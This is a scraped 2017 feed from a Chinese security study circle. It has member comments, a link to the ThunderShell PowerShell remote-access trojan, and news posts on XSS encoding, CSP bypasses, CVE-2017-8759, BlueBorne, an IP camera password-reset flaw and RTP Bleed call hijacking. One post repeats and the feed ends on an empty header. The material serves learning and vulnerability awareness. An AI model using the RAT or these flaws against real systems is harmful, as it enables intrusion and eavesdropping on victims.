<img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 呐喊一声，表示自己存在，今年2月份关注公众号，看啥都是一脸懵逼。直到现在看圈子里的东西都能很快了解，只要我想。但是一个人搞慢慢激情没了，想提前出去了[流泪]

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 看来你进步还挺快的

<img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 每天十个小时左右不是白花的[捂脸][捂脸][捂脸]

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 本圈榜样呀

<img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: [捂脸][捂脸][捂脸]

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 感觉这样的一些经验非常有用！
很多技术自己可以在网上找到并学习，可经验没那么容易学到，希望弦大以后也多分享一些经验

<img src="https://file.xiaomiquan.com/d0/a6/d0a6bd64a71f311230b389d24ccb776db8b01aac7202b724d5a5c7946ebd8148.jpeg" width="25px"/> __777__: 我感觉如果之前是程序员再来学这个，会容易很多吧，我之前是做php的，感觉在学python，容易多了

<img src="https://file.xiaomiquan.com/3f/55/3f55a881c0f3bf180f35b158719357e46da88c9338ac01cfa75b778deaa6f589.jpg" width="25px"/> __Ares___: 每天恶补 基础 努力赶上进度[流泪][流泪]

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 经典

<img src="https://file.xiaomiquan.com/2e/d6/2ed601f524a093a2ef25692413f618bd2d947cde8075dc813b98205b2daef33d.jpg" width="25px"/> __据说好的名字很容易被别人记住__: 看到这篇，终于下定决心进来了😂

<img src="https://file.xiaomiquan.com/d2/18/d218f1e1f6265c71a5b8590ca5f47d80f81ca4d5998c8fc968e01ad974e43fb0.jpg" width="25px"/> __trav__: 被逼的😂

<img src="https://file.xiaomiquan.com/5c/bd/5cbd7f0b7ac534321eb23f3e8066f6655a51a18a2e8f52bdaf21086c90c596dc.jpg" width="25px"/> __小楼昨夜又没风__: 同样是看到这篇文章入的圈，相信努力，相信自己。

<img src="https://file.xiaomiquan.com/2e/d6/2ed601f524a093a2ef25692413f618bd2d947cde8075dc813b98205b2daef33d.jpg" width="25px"/> __据说好的名字很容易被别人记住__ replies to <img src="https://file.xiaomiquan.com/5c/bd/5cbd7f0b7ac534321eb23f3e8066f6655a51a18a2e8f52bdaf21086c90c596dc.jpg" width="25px"/> __小楼昨夜又没风__: 学生党，但是也值了😌

<img src="https://file.xiaomiquan.com/5c/bd/5cbd7f0b7ac534321eb23f3e8066f6655a51a18a2e8f52bdaf21086c90c596dc.jpg" width="25px"/> __小楼昨夜又没风__ replies to <img src="https://file.xiaomiquan.com/2e/d6/2ed601f524a093a2ef25692413f618bd2d947cde8075dc813b98205b2daef33d.jpg" width="25px"/> __据说好的名字很容易被别人记住__: 😄


...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-09-17:


__#tools#__

 ThunderShell基于PowerShell的RAT,使用HTTP进行通信。网络流量使用RC4进行加密

[https://github.com/Mr-Un1k0d3r/ThunderShell](https://github.com/Mr-Un1k0d3r/ThunderShell)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: RingZer0 Team 最近真活跃，已经开源了好几个项目了

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 猪猪侠吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 不是


...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-09-17:


__#tools#__

 ThunderShell基于PowerShell的RAT,使用HTTP进行通信。网络流量使用RC4进行加密

[https://github.com/Mr-Un1k0d3r/ThunderShell](https://github.com/Mr-Un1k0d3r/ThunderShell)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: RingZer0 Team 最近真活跃，已经开源了好几个项目了

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 猪猪侠吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 不是


...

---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-09-15:

> 白某某人 提问：
xss理论上说只要能执行javascrap代码就能执行呀，什么您之前在精华中的一篇文章讲到一个xss是safari xss？意思是只有safari才能执行这个xss吗？


你理解有偏差 xss跟浏览器平台无关 只是之前说的那个xss只能在Safari上执行成功，Chrome或者edge 对这类xss已经有防护了



...

<img src="https://file.xiaomiquan.com/fb/81/fb811caceb3cd53b46da8564fc045cb9cce3046ae4a13c3b7e7b17b18fd74d5c.jpg" width="25px"/> __白某某人__: 谢谢[爱心]

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 有很多xss的构造方法仅限于一种浏览器，xss如果说和浏览器没有关系，有点片面吧。虽然就此例来说是其他浏览器做了防护，但有的xss只是由于某款浏览器的特性而存在的啊～

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 确实有些会与浏览器机制有关


...

---

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ on 2017-09-14:


__#基础#__

  XSS 编码基础

在之前的分享中，圈子里的小伙伴问过我关于编码的问题。

先感谢下小伙伴的反馈与提问，证明确实用心看了，没白写[呲牙]。

这边也整理了一篇很基础的编码知识给刚入门的同学：

[XSS 编码的一些基础知识 | 灰色地带](http://www.ev1l.cn/2017/09/08/xss_charset/)



文中提及了：URI 百分号编码、HTML 实体编码、JS Unicode 编码、JS 8进制、16进制转义等内容。

也希望大家在日常分享里多互动，形成一个良好的循环。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 就喜欢看你科普[偷笑]

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这句话看得我老腚一红🤣

<img src="https://file.xiaomiquan.com/02/c2/02c29c774c01e67904e2a54d7c47a07b32e73898a3e9863a47a26b93099e474e.jpg" width="25px"/> __桔多淇__: 早点看到兴许考试那会就有思路啦[撇嘴]

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/02/c2/02c29c774c01e67904e2a54d7c47a07b32e73898a3e9863a47a26b93099e474e.jpg" width="25px"/> __桔多淇__: 缘，妙不可言[奸笑]

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 我是来给你点赞的，我问了这个问题，自己却没有深入去研究，反思我自己！或许这就是大佬吧，膜拜

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 给你点赞，不懂多问是个好习惯。你离成功就差一半了[机智]

<img src="https://file.xiaomiquan.com/8a/00/8a00823a2d2b29c76d87cc253a89db95d653b298bbc472249666c903f4416907.jpg" width="25px"/> __hurricane618__: 赞👍


...

---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-09-14:


__#资讯#__

  最近Talos公布了一个浏览器漏洞细节，讲的是利用绕过服务器设置的内容安全策略(CSP)，导致隐私信息泄露。
这个跟我之前分享的 “通过Safari浏览器获取MacOS系统的敏感信息”，都是利用内容安全策略这个安全机制。不过，这个这个漏洞覆盖的范围更广，Edge、Chrome、Safari都受影响。
相关链接:

[【技术分享】如何绕过Edge、Chrome和Safari的内容安全策略 - 安全客 - 有思想的安全新媒体](https://m.bobao.360.cn/learning/appdetail/4406.html)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: about:blank 是一个神奇魔法点

<img src="https://file.xiaomiquan.com/39/32/3932a4820301a95b470ff3b43bd2e8e066b12c718ab2cdf190f22f91e51203c8.jpg" width="25px"/> __第可衡量未经确定号病人__: 我大概看懂了😆


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-13:


__#漏洞#__

  最新的 Office 高级威胁攻击预警CVE-2017-8759)

还有这个，自己看吧...

今天漏洞大集中啊，今晚不用睡觉了。


[【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警 - 安全客 - 有思想的安全新媒体](http://m.bobao.360.cn/learning/detail/4411.html)



<img src="https://images.xiaomiquan.com/FrL3tYnCvYclyL-CYbwZkfiI-L_p?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:JLmf99jlgcli0qZWDoyhxoSzw4o=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/cc/98/cc984e93368c4fb374909e4f3a7d739363b817c3944f1e6c90b761d9703b9b5f.jpg" width="25px"/> __Sky Lotus__: 笔记本搞没电了。。

<img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 公司内网电脑单纯的打补丁是否可行？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: 打补丁好啊 尽快打

<img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 内网为何也要打补丁？虚机形式存在且完全不与互联网连接啊

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 如果你自信满满，没问题啊

<img src="https://file.xiaomiquan.com/1a/db/1adbf2af8762674318ce8f35cd5ccd83e520ad1436bb0acb2031848305e544e3.jpg" width="25px"/> __小峰__ replies to <img src="https://file.xiaomiquan.com/74/5e/745edea4e49022b74099ca16e653b7177e9ea16ff8e52cc8b1a950dfb835406c.jpg" width="25px"/> __Tsinghua&MIT__: 内网更重要，也就更危险。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-13:


__#漏洞#__

  BlueBorne 蓝牙攻击


[http://go.armis.com/hubfs/BlueBorne%20Technical%20White%20Paper.pdf](http://go.armis.com/hubfs/BlueBorne%20Technical%20White%20Paper.pdf)



又是个有 Logo 的漏洞，细节如上，下面这个演示视频好屌：


[BlueBorne接管Android系统的演示](https://m.v.qq.com/play.html?vid=r054937flzf)



<img src="https://images.xiaomiquan.com/FgukHfLYbLlnnRDZxVNCYYblTYtj?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:I3WYOHabMgYTTirzkS3Hin0k3Rw=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FhnnCiK4PqdKcP7iWs0_4Qdra62r?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:o8DBpm-wMyR8tFubEk4wniqnFuY=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 哇🐒

<img src="https://file.xiaomiquan.com/c0/db/c0db0a01591a61bbcb6b3f8cafd9f1d0339ae08be7b21ec1fdab6c829aa452fb.jpeg" width="25px"/> __Steven__: 看不见黑客的屏幕

<img src="https://file.xiaomiquan.com/3a/75/3a759eaba8d7bbf02a326049dd7d19d00f0823f4a3e3191631c8bf6a9217c938.jpg" width="25px"/> __.X__: 想知道怎么去利用，细节看不懂[大哭][大哭][大哭]


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-13:

看来一篇文章，分析了face ID与传统密码在不同威胁场景下的安全性。提取简介如下：iPhone X带着face ID闪亮登场，这回不能用照片骗过人脸设别了。但是，face ID真的安全吗？这取决于你的身份，准确的说，取决于你面临的威胁模型。
一个普通教师和机场工作人员或者政府机构雇员所面临的威胁模型是完全不同的。对大多数人来说，最大的威胁可能就是手机被盗，这种情况下face ID基本上是安全的。对于一些特殊人群来说，存在着连人带手机被某些势力捕获(或误捕)的可能，这时候，face ID或指纹识别会让搜查你手机里的机密资料变得轻而易举，此时传统密码似乎安全性要好的多。

[Does Face ID make the iPhone X more secure? Depends who's asking | ZDNet](http://www.zdnet.com/article/is-face-id-secure-it-depends/#ftag=RSSbaffb68)



<img src="https://images.xiaomiquan.com/FtB63HhIDuMK-xo-NxNSe5bNk3oJ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:-2hlQku_svH6p412PcBLBuyCumE=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 没事多背几条强密码还是有用的

<img src="https://file.xiaomiquan.com/d2/18/d218f1e1f6265c71a5b8590ca5f47d80f81ca4d5998c8fc968e01ad974e43fb0.jpg" width="25px"/> __trav__: 没太懂，其中有一点讲的是美国法律不能强制从人脑中的想法取证，却可以从人身体取证吗，在这一点上密码比face ID要有用，这也是ios11从开始就强制性的让每个使用者设置自己的强密码的原因

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 其实只要被绑架，如果来得及，立马关机，此时再被开机的话就需要输入密码了

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 还是脑电波解码靠谱

<img src="https://file.xiaomiquan.com/88/ba/88baf27d18a55ca81cb25b0279ab02127bac65f1d2a9cdfbc724c0cf7512f7e9.jpg" width="25px"/> __In&eRes7ing__: 一般特殊人群不会用iphone吧。。
其次用密码，人家对你严刑拷打，也保不准一打什么都说了。

<img src="https://file.xiaomiquan.com/df/db/dfdb475f56fe4b4b719dce753a972e44dde472d02173b528a841c3d4c41bcf1c.jpg" width="25px"/> __静候佳音__: 如果能够偷偷报警
 还是诺基亚按键手机更方便
想象一下


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-13:

汉邦高科IP摄像头任意密码重置
__#漏洞#__

 
[SSD Advisory – Hanbanggaoke IP Camera Arbitrary Password Change – SecuriTeam Blogs](https://blogs.securiteam.com/index.php/archives/3420)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 第一次听说这家，这个漏洞很低级[捂脸]

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 林子大了什么洞都有[捂脸]

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 脑子里出现的是「鸟大了什么洞都有」……


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-13:


__#漏洞#__

  那些年的经典漏洞利用（二），都是带 Logo 炒过的，你能认出几个？

<img src="https://images.xiaomiquan.com/FnC2wiwk5ckI_pb4kzT31VatooTD?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:xgHPuWI8j9MqcI5QBp84YwV7ufE=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FgAdUWQ7giQ8tkrqqwrmtmphCTu2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:tex8-2Tv9UK75CQ_qHYbcJGCHo0=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FpdFFgZ18A2d9fvtdxJA7KTtvv17?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:mnbhllW5zX-f39cA3wv1AXHRBK8=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fr_sixCW1H_opVj1aJ1BH1qnQyVn?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:pmpP0DxY8_-cDFCikf-sBhCH7BU=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FjDzzZZT7vdc-4p6jCC2Mrzkxz_z?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:U8opE07Y6gwS0ORw7a5beMmioZc=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-13:


__#漏洞#__

  那些年的经典漏洞利用（一），都是带 Logo 炒过的，你能认出几个？

<img src="https://images.xiaomiquan.com/FmVF6aclhyqBgo3944_v_iPsD-2n?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:rRqzvVOoQ2wZ_AhaUrlvNVYosQg=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FqT-Ub3cDyJvw-212QpNFsuKoOCm?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:GKFycxrjaEN9ysQoa9IDjW81liA=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FjMURKL9VGpF1M2yzgfVXHUS5Cbx?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:sKUtswdHfxfiVoXijADz5Bfda20=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FvpjkQb7nx5ugyQq7mx3XW9FlEKg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:UYIheVRZZ3J2yY939X8465sOP7o=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FimWZxP2iDvf59yAnWdR4jgqN8Jg?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:fCLOxKUEp0oJ4hmqp-DhjbDNcJE=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fg2r5PmUUR5SsbDk36qoDslfk5h5?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:4Eaos1eMLT6VsbnjpFl0REwafNI=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FhftMKEUfjbOqalRoctScoCf5g6w?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:NvsA09f9mg1oHFjSCC1NGSCSIK4=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FlSY8WPCU5qIUTiQDEnZoaC6aY0n?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Pq503Ag56nr6k2Rzzeu4S4kenjM=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fo-fJWEzlJdVHjfuBbmV1Hq1RVyq?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:gzV4-yIin4oe33RLtGctGmNRRXY=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/4f/a8/4fa8f05eefc5eab90000a1831045148e7f5cb5bea18429e9a930c85a9fc8dbbc.jpg" width="25px"/> __邢瑞东__: 第一个😂

<img src="https://file.xiaomiquan.com/c5/5f/c55f4dda15a2ece0b07aabb633958caf05757d4bfbe07f0dcad798c1975b04f6.jpg" width="25px"/> __城市浪人__: 我都认识，但是……

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 只认得心脏流血


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-13:


__#漏洞#__

  RTP Bleed 来了，RTP 协议的心脏出血

这个 0day 前些天就看到，不过没重视，现在又看到，还是重视下吧，说不定对一些人有用。

这里影响的实例是：

Asterisk 14.4.0
RTPproxy (tested 1.2.1-2ubuntu1 and RTPproxy 2.2.alpha.20160822 (git))

简单解释下，这个 RTP 协议叫实时传输协议，流媒体应用场景经常会基于这个协议。这次出血和这个协议的设计缺陷有点关系，但并不是完全关系，主要还是和 RTP Proxy 的场景缺陷有关。

带来的直接影响是，可以任意注入伪造音频，可以盗取音视频流，也就是做到所谓的语音通信劫持，只是这种劫持并不需要中间人场景，直接远程搞定！

漏洞官网有更具体描述：

[https://rtpbleed.com](https://rtpbleed.com)



Asterisk 这家被影响的具体描述：

[advisories/README.md at master · EnableSecurity/advisories · GitHub](https://github.com/EnableSecurity/advisories/blob/master/ES2017-04-asterisk-rtp-bleed/README.md)



<img src="https://images.xiaomiquan.com/FlxHAgs09I4H1aVzDI9n3wKzqAh2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:2clOt3DhSmQ_UbS3ku6x81CQaj8=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 那些老协议，没认证与加密设计的，都会出大问题，多个 S 多关键。

<img src="https://file.xiaomiquan.com/a0/3d/a03d634712148eba587564aee27dc9c307427740d140d4b4aee5cd13ff998fd9.jpg" width="25px"/> __石头劲__: 感觉风险没那么高，RTP PROXYDE侦听端口每会话随机分配，会话一结束就释放了。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-12:

